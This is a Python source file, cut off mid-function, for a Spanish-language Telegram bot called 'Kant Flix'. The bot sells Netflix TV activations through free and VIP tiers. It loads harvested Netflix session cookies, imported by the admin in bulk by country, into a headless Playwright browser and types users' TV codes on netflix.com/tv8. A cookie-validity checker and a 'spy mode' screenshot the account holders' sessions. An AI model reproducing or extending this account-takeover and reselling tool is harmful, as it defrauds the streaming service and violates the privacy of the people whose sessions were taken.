import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import json
import os
import time
import threading
import random
import string
import traceback
from datetime import datetime, timedelta
from flask import Flask
from playwright.sync_api import sync_playwright

# Configuración inicial
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', 'TU_TOKEN_AQUI')
bot = telebot.TeleBot(TELEGRAM_TOKEN)
app = Flask(__name__)

SUPER_ADMIN_ID = 8398522835 
ADMIN_USERNAME = "izi_1244"
ADMIN_LINK = f"https://t.me/{ADMIN_USERNAME}"

MAX_USES_PER_COOKIE = 3
RATE_LIMIT_SECONDS = 60

# Cache global para optimizar y seguridad
user_last_action = {}
db_lock = threading.Lock()
bot_info = None

def init_db():
    with db_lock:
        default_db = {
            'cookies_list': [], 'admins': [SUPER_ADMIN_ID], 'maintenance_mode': False,
            'banned_users': [], 'user_profiles': {}, 'coupons': {},
            'stats': {'total_activations': 0, 'failed_attempts': 0, 'total_revenue_estim': 0},
            'plans': {
                'free': {'name': 'Gratis', 'daily_limit': 1, 'choose_country': False},
                'vip': {'name': 'VIP 💎', 'daily_limit': 9999, 'choose_country': True}
            }
        }
        
        if not os.path.exists('database.json'):
            return default_db
            
        try:
            with open('database.json', 'r') as f:
                db = json.load(f)
                for key in default_db:
                    if key not in db: db[key] = default_db[key]
                if SUPER_ADMIN_ID not in db['admins']: db['admins'].append(SUPER_ADMIN_ID)
                
                for uid, profile in db['user_profiles'].items():
                    if 'plan' not in profile: profile['plan'] = 'free'
                    if 'vip_expiry' not in profile: profile['vip_expiry'] = None
                    if 'daily_activations' not in profile: profile['daily_activations'] = 0
                    if 'last_reset_date' not in profile: profile['last_reset_date'] = datetime.now().strftime("%Y-%m-%d")
                    if 'referrals' not in profile: profile['referrals'] = 0
                    if 'bonus_daily' not in profile: profile['bonus_daily'] = 0
                return db
        except:
            return default_db

def save_db(db_data):
    with db_lock:
        with open('database.json', 'w') as f:
            json.dump(db_data, f, indent=4)

def is_admin(user_id):
    if user_id == SUPER_ADMIN_ID: return True
    db = init_db()
    return user_id in db.get('admins', [])

def auto_repair_system():
    """Limpia archivos fantasma y libera RAM sin que el usuario se entere."""
    try:
        clean_old_screenshots()
        # Limpiar diccionario de spam para evitar que crezca infinitamente
        now = time.time()
        for k in list(user_last_action.keys()):
            if now - user_last_action[k] > 3600:
                del user_last_action[k]
    except: pass

def check_and_reset_daily_limits(uid_str, db):
    today = datetime.now().strftime("%Y-%m-%d")
    profile = db['user_profiles'].get(uid_str)
    
    if profile:
        if profile.get('last_reset_date') != today:
            profile['daily_activations'] = 0
            profile['last_reset_date'] = today
            save_db(db)
    auto_repair_system()
    return profile

def check_vip_status(user_id):
    db = init_db()
    uid_str = str(user_id)
    profile = db['user_profiles'].get(uid_str, {})
    
    if profile.get('plan') == 'vip' and profile.get('vip_expiry'):
        expiry_date = datetime.strptime(profile['vip_expiry'], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiry_date:
            db['user_profiles'][uid_str]['plan'] = 'free'
            db['user_profiles'][uid_str]['vip_expiry'] = None
            save_db(db)
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Renovar VIP Ahora", url=ADMIN_LINK))
            bot.send_message(user_id, "⚠️ **Tu suscripción VIP ha caducado.** Has vuelto al plan Gratuito.\n\nPulsa abajo para renovar con el Administrador.", reply_markup=markup, parse_mode="Markdown")
            return False
        return True
    return False

def track_user(message, referred_by=None):
    db = init_db()
    user_id = str(message.from_user.id)
    is_new = False
    
    if user_id not in db['user_profiles']:
        is_new = True
        bonus = 1 if referred_by else 0 
        db['user_profiles'][user_id] = {
            'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'username': message.from_user.username,
            'first_name': message.from_user.first_name,
            'activations': 0,
            'plan': 'free',
            'daily_activations': 0,
            'last_reset_date': datetime.now().strftime("%Y-%m-%d"),
            'vip_expiry': None,
            'referrals': 0,
            'bonus_daily': bonus
        }
        
        if referred_by and referred_by in db['user_profiles'] and referred_by != user_id:
            db['user_profiles'][referred_by]['referrals'] += 1
            refs = db['user_profiles'][referred_by]['referrals']
            
            if refs % 2 == 0:
                current_expiry = db['user_profiles'][referred_by].get('vip_expiry')
                now = datetime.now()
                
                if db['user_profiles'][referred_by]['plan'] == 'vip' and current_expiry:
                    new_expiry = datetime.strptime(current_expiry, "%Y-%m-%d %H:%M:%S") + timedelta(days=1)
                else:
                    new_expiry = now + timedelta(days=1)
                    
                db['user_profiles'][referred_by]['plan'] = 'vip'
                db['user_profiles'][referred_by]['vip_expiry'] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
                db['user_profiles'][referred_by]['daily_activations'] = 0
                
                try:
                    bot.send_message(int(referred_by), f"🎉 **¡ENHORABUENA!** 🎉\n\nHas invitado a tu referido número {refs}. ¡Acabas de ganar **1 DÍA VIP GRATIS** de forma automática! 💎", parse_mode="Markdown")
                except: pass
            else:
                try:
                    bot.send_message(int(referred_by), f"👤 **¡Nuevo invitado unido!** (Llevas {refs}).\n¡Solo te falta 1 más para ganar 1 Día VIP! 💎", parse_mode="Markdown")
                except: pass
                
        save_db(db)
    else:
        db['user_profiles'][user_id]['username'] = message.from_user.username
        db['user_profiles'][user_id]['first_name'] = message.from_user.first_name
        save_db(db)
    return is_new

def check_rate_limit(user_id):
    if is_admin(user_id) or check_vip_status(user_id): return True
    now = time.time()
    if user_id in user_last_action:
        if now - user_last_action[user_id] < RATE_LIMIT_SECONDS: return False
    user_last_action[user_id] = now
    return True

def clean_old_screenshots():
    for file in os.listdir():
        if file.endswith('.png') and file.startswith(('error_', 'spy_')):
            try: os.remove(file)
            except: pass

def generate_coupon_code(days):
    letters_and_digits = string.ascii_uppercase + string.digits
    code = ''.join(random.choice(letters_and_digits) for i in range(8))
    return f"VIP-{code[:4]}-{code[4:]}"

def parse_netscape_cookies(text):
    cookies = []
    for line in text.split('\n'):
        line = line.strip()
        if not line or not line.startswith('.'): continue
        parts = line.split()
        if len(parts) >= 7:
            domain = parts[0]
            path = parts[2]
            secure = parts[3].upper() == 'TRUE'
            name = parts[5]
            value = parts[6]
            cookies.append({"name": name, "value": value, "domain": domain, "path": path, "secure": secure})
    return cookies

def run_playwright_activation(code, cookie_data):
    screenshot_path = f"error_{int(time.time())}.png"
    browser = None
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'])
            context = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            if isinstance(cookie_data, str): cookies = json.loads(cookie_data)
            else: cookies = cookie_data
            
            context.add_cookies(cookies)
            page = context.new_page()
            
            try:
                page.goto('https://www.netflix.com/tv8', timeout=60000)
                page.wait_for_load_state("domcontentloaded")
                time.sleep(2)
                
                if "login" in page.url.lower():
                    page.screenshot(path=screenshot_path)
                    return False, "❌ La cookie ha caducado o la cuenta cambió de contraseña.", screenshot_path
                
                input_locator = page.locator('input[type="text"], input[type="tel"], input[type="number"], input[data-uia="pin-number-input"]').first
                input_locator.click(timeout=15000)
                page.keyboard.type(code, delay=100)
                
                button_locator = page.locator('button[type="button"], button[type="submit"], button[data-uia="action-submit"]').first
                button_locator.click(timeout=10000)
                
                time.sleep(4)
                if page.locator('.ui-message-error, [data-uia="error-message-container"]').is_visible():
                    page.screenshot(path=screenshot_path)
                    error_text = page.locator('.ui-message-error, [data-uia="error-message-container"]').first.text_content()
                    return False, f"❌ Netflix rechazó el código: {error_text}", screenshot_path
                
                return True, "🎉 ¡**TV Activada con éxito**! 📺✨\n\nTu televisor ha sido enlazado correctamente.\n¡Disfruta del mejor contenido!", None
            except Exception as e:
                page.screenshot(path=screenshot_path)
                return False, f"❌ Error de lectura en Netflix. Detalles: {str(e)[:80]}", screenshot_path
            finally:
                if browser: browser.close()
    except Exception as e:
        return False, f"❌ Error crítico de servidor. {str(e)[:80]}", None

def check_cookie_validity(cookie_data):
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
            context = browser.new_context()
            if isinstance(cookie_data, str): cookies = json.loads(cookie_data)
            else: cookies = cookie_data
            context.add_cookies(cookies)
            page = context.new_page()
            page.goto('https://www.netflix.com/browse', timeout=30000)
            page.wait_for_load_state("domcontentloaded")
            time.sleep(3)
            is_valid = page.locator('.account-menu-item, [data-uia="header-profile-link"]').is_visible()
            if not is_valid and "login" not in page.url.lower(): is_valid = True
            browser.close()
            return is_valid
    except:
        return False

def background_spy(chat_id, msg_id, cookie_data):
    screenshot_path = f"spy_{int(time.time())}.png"
    browser = None
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
            context = browser.new_context(viewport={'width': 1280, 'height': 720})
            if isinstance(cookie_data, str): cookies = json.loads(cookie_data)
            else: cookies = cookie_data
            context.add_cookies(cookies)
            page = context.new_page()
            page.goto('https://www.netflix.com/browse', timeout=40000)
            time.sleep(5) 
            page.screenshot(path=screenshot_path)
            
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(chat_id, photo, caption="📸 **Captura en Vivo (Modo Espía)**\n_Viendo lo que ve el usuario..._", parse_mode="Markdown")
            bot.delete_message(chat_id, msg_id)
    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ Error en Modo Espía. Detalles: {str(e)[:100]}")
    finally:
        if browser:
            try: browser.close()
            except: pass
        if os.path.exists(screenshot_path):
            try: os.remove(screenshot_path)
            except: pass

def background_check_cookies(chat_id):
    db = init_db()
    buenas = 0; malas = 0
    report = "📋 **REPORTE DE DIAGNÓSTICO INTELIGENTE** 📋\n\n"
    for i, c in enumerate(db['cookies_list']):
        if c['status'] == 'active':
            is_valid = check_cookie_validity(c['data'])
            if not is_valid:
                db['cookies_list'][i]['status'] = 'exhausted'
                malas += 1
                report += f"❌ Cuenta #{i+1} ({c.get('country','N/A')}) ➔ `Sesión Caducada`\n"
            else:
                buenas += 1
                report += f"✅ Cuenta #{i+1} ({c.get('country','N/A')}) ➔ `Operativa`\n"
    save_db(db)
    report += f"\n📊 **Resumen Global:** {buenas} Vivas | {malas} Eliminadas."
    bot.send_message(chat_id, report, parse_mode="Markdown")

def main_user_keyboard(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("📺 Activar TV"), KeyboardButton("💎 Mi Suscripción"))
    markup.add(KeyboardButton("🎟️ Canjear Cupón"), KeyboardButton("🎁 Invitar y Ganar"))
    markup.add(KeyboardButton("ℹ️ Ayuda"))
    if is_admin(user_id):
        markup.add(KeyboardButton("👑 Panel Admin"))
    return markup

def countries_keyboard(is_vip):
    db = init_db()
    active_countries = set()
    for c in db['cookies_list']:
        if c['status'] == 'active': active_countries.add(c.get('country', 'N/A'))
    
    markup = InlineKeyboardMarkup(row_width=2)
    
    if is_vip:
        for country in active_countries:
            markup.add(InlineKeyboardButton(f"🌍 {country}", callback_data=f"tv_country_{country}"))
        markup.add(InlineKeyboardButton("🎲 Aleatorio (El más rápido)", callback_data="tv_country_random"))
    else:
        markup.add(InlineKeyboardButton("🎲 Asignación Automática (Gratis)", callback_data="tv_country_random"))
        if active_countries:
            for country in active_countries:
                markup.add(InlineKeyboardButton(f"🔒 {country}", callback_data="upgrade_vip_promo"))
    return markup

def admin_panel_keyboard(db):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("➕ Añadir Cookie", callback_data="admin_add_cookie"), InlineKeyboardButton("📥 Importar Lote", callback_data="admin_bulk_import"))
    markup.add(InlineKeyboardButton("🎟️ Crear Cupón VIP", callback_data="admin_create_coupon"), InlineKeyboardButton("💎 Gestionar Planes", callback_data="admin_manage_plans"))
    markup.add(InlineKeyboardButton("💳 Gestionar Usuarios", callback_data="admin_manage_users"), InlineKeyboardButton("📊 Estado Cuentas", callback_data="admin_status"))
    markup.add(InlineKeyboardButton("📸 Modo Espía", callback_data="admin_spy_menu"), InlineKeyboardButton("🔍 Diagnóstico Pro", callback_data="admin_check"))
    markup.add(InlineKeyboardButton("👥 Admins", callback_data="admin_manage_admins"), InlineKeyboardButton("🏆 Top Referidos", callback_data="admin_top_refs"))
    markup.add(InlineKeyboardButton("📢 Mensaje Masivo", callback_data="admin_broadcast"), InlineKeyboardButton("🛡️ Panel Baneos", callback_data="admin_bans"))
    markup.add(InlineKeyboardButton("📄 Exportar BD", callback_data="admin_backup"), InlineKeyboardButton("📄 Exportar Usuarios", callback_data="admin_export_users"))
    markup.add(InlineKeyboardButton("🧹 Limpiar Agotadas", callback_data="admin_clear_dead_cookies"), InlineKeyboardButton("⚙️ Forzar Limpieza", callback_data="admin_clear_cache"))
    maint_text = "🔴 Quitar Mantenimiento" if db.get('maintenance_mode', False) else "🟢 Poner Mantenimiento"
    markup.add(InlineKeyboardButton(maint_text, callback_data="admin_toggle_maint"))
    return markup

def admin_plans_keyboard(db):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(f"✏️ Editar Límite Gratis ({db['plans']['free']['daily_limit']}/día)", callback_data="admin_edit_plan_free"),
        InlineKeyboardButton(f"✏️ Editar Límite VIP ({db['plans']['vip']['daily_limit']}/día)", callback_data="admin_edit_plan_vip"),
        InlineKeyboardButton("🔙 Volver al Panel", callback_data="admin_back_panel")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    global bot_info
    if not bot_info: bot_info = bot.get_me()
    
    args = message.text.split()
    referred_by = None
    if len(args) > 1 and args[1].isdigit(): referred_by = args[1]
        
    is_new = track_user(message, referred_by)
    user_id = message.from_user.id
    db = init_db()
    check_and_reset_daily_limits(str(user_id), db)
    
    if user_id in db.get('banned_users', []): return
    if db.get('maintenance_mode', False) and not is_admin(user_id):
        bot.send_message(message.chat.id, "🛠️ *MODO MANTENIMIENTO*\nEstamos realizando mejoras. Vuelve más tarde.", parse_mode="Markdown")
        return

    profile = db['user_profiles'][str(user_id)]
    base_lim = db['plans']['free']['daily_limit']
    total_lim = base_lim + profile.get('bonus_daily', 0)

    texto = (
        "🎬 *¡Bienvenido al Centro de Activación Netflix TV!* 🎬\n\n"
        "Activa tu televisor en segundos sin necesidad de correos ni contraseñas.\n\n"
        f"🎁 *Tu Plan Actual:* Tienes **{total_lim} Activaciones Diarias Gratuitas**.\n\n"
        "💎 *¿Quieres accesos ilimitados, cero esperas y elegir tu país favorito?*\n"
        "Pulsa el botón de abajo para conseguir tu **Pase VIP**.\n\n"
        "👇 *Pulsa 📺 Activar TV en el menú para empezar.*"
    )
    if is_new and referred_by:
        texto = "🎉 *¡Bienvenido gracias a la invitación de un amigo!* 🎉\nHas recibido +1 Activación Diaria adicional como regalo.\n\n" + texto

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💬 Comprar VIP (Contactar Admin)", url=ADMIN_LINK))
    
    bot.send_message(message.chat.id, texto, reply_markup=markup, parse_mode="Markdown")
    # Mandamos el teclado normal también
    bot.send_message(message.chat.id, "Selecciona una opción del menú de abajo:", reply_markup=main_user_keyboard(user_id))

@bot.message_handler(func=lambda m: m.text == "💎 Mi Suscripción")
def show_subscription(message):
    track_user(message)
    db = init_db()
    uid = str(message.from_user.id)
    profile = check_and_reset_daily_limits(uid, db)
    is_vip = check_vip_status(message.from_user.id)
    db = init_db() 
    
    markup = InlineKeyboardMarkup()
    if is_vip:
        plan_info = db['plans']['vip']
        texto = f"👑 **PERFIL VIP ACTIVO** 👑\n\n🔹 **Estado:** Privilegiado\n🔹 **Válido hasta:** `{profile['vip_expiry']}`\n🔹 **Límite Diario:** {plan_info['daily_limit']} TVs/día\n🔹 **Hoy has usado:** {profile['daily_activations']}\n\n✨ *Gracias por apoyar nuestro servicio.*"
        markup.add(InlineKeyboardButton("💬 Hablar con el Soporte", url=ADMIN_LINK))
    else:
        plan_info = db['plans']['free']
        limite_total = plan_info['daily_limit'] + profile.get('bonus_daily', 0)
        restantes = limite_total - profile['daily_activations']
        if restantes < 0: restantes = 0
        texto = f"👤 **PERFIL ESTÁNDAR (Gratis)** 👤\n\n🔹 **Activaciones hoy:** `{profile['daily_activations']}/{limite_total}`\n🔹 **Disponibles ahora:** `{restantes}`\n🔹 **Renovación de usos:** Medianoche (00:00)\n\n🛒 *¿Quieres saltarte el límite y elegir país?*\n"
        markup.add(InlineKeyboardButton("💎 Comprar Pase VIP", url=ADMIN_LINK))
        
    bot.reply_to(message, texto, reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "🎁 Invitar y Ganar")
def show_referral_menu(message):
    track_user(message)
    global bot_info
    if not bot_info: bot_info = bot.get_me()
    
    uid = str(message.from_user.id)
    db = init_db()
    refs = db['user_profiles'][uid].get('referrals', 0)
    bot_link = f"https://t.me/{bot_info.username}?start={uid}"
    
    texto = (
        "🎁 **SISTEMA DE REFERIDOS VIRAL** 🎁\n\n"
        "¿No tienes dinero para el VIP? ¡Gánalo invitando a tus amigos!\n\n"
        f"👥 **Tus invitados actuales:** `{refs}`\n\n"
        "🏅 **TUS PREMIOS:**\n"
        "• Cada **2 amigos** que invites = **1 Día de VIP ILIMITADO** automático.\n"
        "• Tus amigos ganarán **2 usos diarios** (en vez de 1).\n\n"
        "🔗 **TU ENLACE ÚNICO:**\n"
        f"`{bot_link}`\n\n"
        "_Copia este enlace y envíalo por WhatsApp o grupos._"
    )
    bot.reply_to(message, texto, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "🎟️ Canjear Cupón")
def ask_coupon(message):
    track_user(message)
    msg = bot.reply_to(message, "🎟️ **Introduce tu código de cupón VIP:**\n_(Ejemplo: VIP-A1B2-C3D4)_", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_coupon)

def process_coupon(message):
    code = message.text.strip().upper()
    user_id = str(message.from_user.id)
    db = init_db()
    
    if code in db['coupons']:
        coupon = db['coupons'][code]
        days = coupon['days']
        
        now = datetime.now()
        current_expiry = db['user_profiles'][user_id].get('vip_expiry')
        
        if current_expiry and check_vip_status(message.from_user.id):
            new_expiry = datetime.strptime(current_expiry, "%Y-%m-%d %H:%M:%S") + timedelta(days=days)
        else:
            new_expiry = now + timedelta(days=days)
            
        db['user_profiles'][user_id]['plan'] = 'vip'
        db['user_profiles'][user_id]['vip_expiry'] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
        db['user_profiles'][user_id]['daily_activations'] = 0 
        
        del db['coupons'][code]
        save_db(db)
        bot.reply_to(message, f"🎉 **¡CUPÓN CANJEADO CON ÉXITO!** 🎉\n\nAcabas de activar `{days} días` de suscripción VIP. ¡Disfruta de ventajas exclusivas!", parse_mode="Markdown")
    else:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💬 Comprar un Cupón", url=ADMIN_LINK))
        bot.reply_to(message, "❌ **Cupón inválido o ya usado.**\n\nSi quieres adquirir un Pase VIP, contacta al administrador.", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "ℹ️ Ayuda")
def help_menu(message):
    texto = (
        "📖 **MANUAL DE USO - KANT FLIX** 📖\n\n"
        "1️⃣ Abre Netflix en tu Televisor.\n"
        "2️⃣ Selecciona la opción *'Iniciar sesión por la Web'*.\n"
        "3️⃣ Te aparecerá un código de 8 dígitos en la pantalla.\n"
        "4️⃣ Ven a este bot, pulsa *'📺 Activar TV'*.\n"
        "5️⃣ Elige tu país y envía el código de 8 dígitos.\n\n"
        "⚠️ _¿Te sale error de 'Límite Diario' o quieres elegir un país específico?_\n\n"
        "💎 **Hazte VIP hoy mismo.** Sin límites de activaciones y con acceso total."
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💬 Comprar VIP (Contacto Directo)", url=ADMIN_LINK))
    bot.reply_to(message, texto, reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📺 Activar TV")
def activate_tv_start(message):
    track_user(message)
    user_id = message.from_user.id
    uid_str = str(user_id)
    db = init_db()
    
    if user_id in db.get('banned_users', []): return
    if db.get('maintenance_mode', False) and not is_admin(user_id):
        bot.reply_to(message, "🛠️ Sistema en mantenimiento. Volvemos enseguida.")
        return
        
    is_vip = check_vip_status(user_id)
    profile = check_and_reset_daily_limits(uid_str, db)
    db = init_db() 
    
    current_plan_name = 'vip' if is_vip else 'free'
    plan_info = db['plans'][current_plan_name]
    limite_diario = plan_info['daily_limit'] + (profile.get('bonus_daily', 0) if not is_vip else 0)
    
    if not is_admin(user_id) and profile['daily_activations'] >= limite_diario:
        texto_limite = (
            f"❌ **LÍMITE DIARIO ALCANZADO** ❌\n\n"
            f"Tu plan actual permite **{limite_diario} activaciones al día**.\n\n"
            f"💎 **¡Rompe el límite!**\nAdquiere el Pase VIP para activaciones ilimitadas y elección de país."
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🛒 COMPRAR VIP AHORA", url=ADMIN_LINK))
        bot.reply_to(message, texto_limite, reply_markup=markup, parse_mode="Markdown")
        return

    if not check_rate_limit(user_id):
        bot.reply_to(message, f"⏳ Por favor, espera {RATE_LIMIT_SECONDS} segundos entre intentos (Sistema Anti-Spam).")
        return

    active_cookies = [c for c in db['cookies_list'] if c['status'] == 'active']
    if not active_cookies:
        bot.reply_to(message, "❌ No hay cuentas disponibles ahora mismo. Avisa al Administrador.")
        return

    bot.send_message(message.chat.id, "🌍 *Selecciona la región para tu TV:*", reply_markup=countries_keyboard(is_vip), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "upgrade_vip_promo")
def promo_vip(call):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💎 Comprar VIP", url=ADMIN_LINK))
    bot.send_message(call.message.chat.id, "🔒 **FUNCIÓN EXCLUSIVA VIP**\n\nLos usuarios gratuitos solo pueden usar la asignación automática. Para elegir este país a la carta, adquiere el Pase VIP pulsando abajo.", reply_markup=markup, parse_mode="Markdown")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("tv_country_"))
def ask_for_tv_code(call):
    country = call.data.replace("tv_country_", "")
    msg = bot.send_message(call.message.chat.id, f"Has elegido: **{country.capitalize()}**.\n\n📺 Envíame el **código de 8 dígitos** que aparece en la pantalla de tu TV:", parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: process_tv_code(m, country))

def process_tv_code(message, country):
    tv_code = message.text.strip().replace(" ", "")
    user_id = message.from_user.id
    uid_str = str(user_id)
    
    if len(tv_code) != 8:
        bot.reply_to(message, "❌ Error: El código debe tener exactamente 8 caracteres.")
        return

    wait_msg = bot.send_message(message.chat.id, "🔄 *Conectando a los servidores y enlazando tu TV...*", parse_mode="Markdown")
    
    db = init_db()
    available_cookie = None
    cookie_index = -1
    
    for i, cookie in enumerate(db['cookies_list']):
        if cookie['status'] == 'active' and (country == 'random' or cookie.get('country', 'N/A') == country):
            available_cookie = cookie
            cookie_index = i
            break
            
    if not available_cookie:
        bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id, text="❌ Vaya, la última cuenta de esa región se acaba de usar. Por favor, prueba la asignación Aleatoria.")
        return
        
    success, result_msg, screenshot_path = run_playwright_activation(tv_code, available_cookie['data'])
    db = init_db() 
    
    if success:
        db['cookies_list'][cookie_index]['uses'] += 1
        if db['cookies_list'][cookie_index]['uses'] >= MAX_USES_PER_COOKIE:
            db['cookies_list'][cookie_index]['status'] = 'exhausted'
        db['stats']['total_activations'] += 1
        
        if not is_admin(user_id):
            db['user_profiles'][uid_str]['daily_activations'] += 1
            
        db['user_profiles'][uid_str]['activations'] += 1
        save_db(db)
        
        bot.delete_message(chat_id=message.chat.id, message_id=wait_msg.message_id)
        bot.send_message(message.chat.id, result_msg, parse_mode="Markdown")
    else:
        db['stats']['failed_attempts'] += 1
        if "caducado" in result_msg.lower():
            db['cookies_list'][cookie_index]['status'] = 'exhausted'
            
        save_db(db)
        bot.delete_message(chat_id=message.chat.id, message_id=wait_msg.message_id)
        bot.reply_to(message, "❌ Fallo al activar tu TV. El error ha sido enviado a los administradores.")
        
        admin_error = f"⚠️ Fallo en código `{tv_code}` de @{message.from_user.username}.\nMotivo: {result_msg}"
        for admin in db.get('admins', []):
            try:
                if screenshot_path and os.path.exists(screenshot_path):
                    with open(screenshot_path, 'rb') as photo:
                        bot.send_photo(admin, photo, caption=admin_error)
                else: bot.send_message(admin, admin_error)
            except: pass
            
        if screenshot_path and os.path.exists(screenshot_path): 
            try: os.remove(screenshot_path)
            except: pass

@bot.message_handler(commands=['admin'])
@bot.message_handler(func=lambda m: m.text == "👑 Panel Admin")
def admin_panel_start(message):
    if not is_admin(message.from_user.id): return
    db = init_db()
    bot.send_message(message.chat.id, "👑 **CENTRO DE MANDOS KANT FLIX** 👑", reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callbacks(call):
    if not is_admin(call.from_user.id): return
    db = init_db()
    
    try:
        if call.data == "admin_create_coupon":
            msg = bot.send_message(call.message.chat.id, "🎟️ ¿Cuántos **DÍAS VIP** otorgará este cupón? (Ej: 30)")
            bot.register_next_step_handler(msg, process_create_coupon)
            
        elif call.data == "admin_manage_plans":
            texto = f"💎 **Gestor de Planes**\n\n🆓 **Gratis:** {db['plans']['free']['daily_limit']}/día\n👑 **VIP:** {db['plans']['vip']['daily_limit']}/día\n\nSelecciona:"
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto, reply_markup=admin_plans_keyboard(db), parse_mode="Markdown")
            
        elif call.data == "admin_edit_plan_free":
            msg = bot.send_message(call.message.chat.id, "✏️ Envía el **NUEVO NÚMERO** de usos al día para GRATIS:")
            bot.register_next_step_handler(msg, lambda m: _edit_plan_limit(m, 'free'))
            
        elif call.data == "admin_edit_plan_vip":
            msg = bot.send_message(call.message.chat.id, "✏️ Envía el **NUEVO NÚMERO** de usos al día para VIP:")
            bot.register_next_step_handler(msg, lambda m: _edit_plan_limit(m, 'vip'))
            
        elif call.data == "admin_back_panel":
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="👑 **CENTRO DE MANDOS KANT FLIX** 👑", reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")

        elif call.data == "admin_manage_users":
            msg = bot.send_message(call.message.chat.id, "💳 Envía la **ID del usuario** para gestionarlo:")
            bot.register_next_step_handler(msg, process_manage_user)

        elif call.data == "admin_status":
            activas = sum(1 for c in db['cookies_list'] if c['status'] == 'active')
            texto = f"📊 **Cuentas Activas:** {activas}\n\n"
            for i, c in enumerate(db['cookies_list']):
                if c['status'] == 'active':
                    texto += f"#{i+1} ({c.get('country','N/A')}) - Usos: {c['uses']}/{MAX_USES_PER_COOKIE}\n"
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto, reply_markup=admin_panel_keyboard(db))
            
        elif call.data == "admin_spy_menu":
            markup = InlineKeyboardMarkup()
            for i, c in enumerate(db['cookies_list']):
                if c['status'] == 'active':
                    markup.add(InlineKeyboardButton(f"📸 Cuenta #{i+1} ({c.get('country')})", callback_data=f"spy_{i}"))
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="📸 **MODO ESPÍA (Selecciona cuenta a capturar)**", reply_markup=markup, parse_mode="Markdown")

        elif call.data == "admin_add_cookie":
            msg = bot.send_message(call.message.chat.id, "🌍 ¿De qué país es la cuenta? (Ej: España, USA):")
            bot.register_next_step_handler(msg, process_add_cookie_country)

        elif call.data == "admin_bulk_import":
            msg = bot.send_message(call.message.chat.id, "📥 ¿De qué país es el LOTE entero?:")
            bot.register_next_step_handler(msg, process_bulk_country)

        elif call.data == "admin_check":
            bot.answer_callback_query(call.id, "🔍 Iniciando diagnóstico... Recibirás el reporte por aquí.")
            threading.Thread(target=background_check_cookies, args=(call.message.chat.id,)).start()

        elif call.data == "admin_manage_admins":
            if call.from_user.id != SUPER_ADMIN_ID: return
            markup = InlineKeyboardMarkup()
            for admin_id in db['admins']:
                markup.add(InlineKeyboardButton(f"ID: {admin_id}", callback_data="noop"), InlineKeyboardButton("❌ Quitar", callback_data=f"del_admin_{admin_id}"))
            markup.add(InlineKeyboardButton("➕ Añadir Nuevo Admin", callback_data="add_new_admin"))
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="👥 **Gestión de Administradores**", reply_markup=markup, parse_mode="Markdown")
            
        elif call.data == "admin_top_refs":
            profiles = db.get('user_profiles', {})
            # Ordenar por referidos de mayor a menor
            sorted_users = sorted(profiles.items(), key=lambda x: x[1].get('referrals', 0), reverse=True)[:10]
            texto = "🏆 **TOP 10 REFERIDORES** 🏆\n\n"
            for i, (uid, prof) in enumerate(sorted_users):
                if prof.get('referrals', 0) > 0:
                    texto += f"{i+1}. @{prof.get('username','N/A')} - **{prof.get('referrals')} invitados**\n"
            if texto == "🏆 **TOP 10 REFERIDORES** 🏆\n\n": texto += "_Nadie ha invitado a nadie aún._"
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=texto, reply_markup=admin_panel_keyboard(db), parse_mode="Markdown")

        elif call.data == "admin_broadcast":
            msg = bot.send_message(call.message.chat.id, "📢 Envía el mensaje que le llegará a TODOS los usuarios:")
            bot.register_next_step_handler(msg, process_broadcast)
            
        elif call.data == "admin_backup":
            if os.path.exists('database.json'):
                with open('database.json', 'rb') as doc:
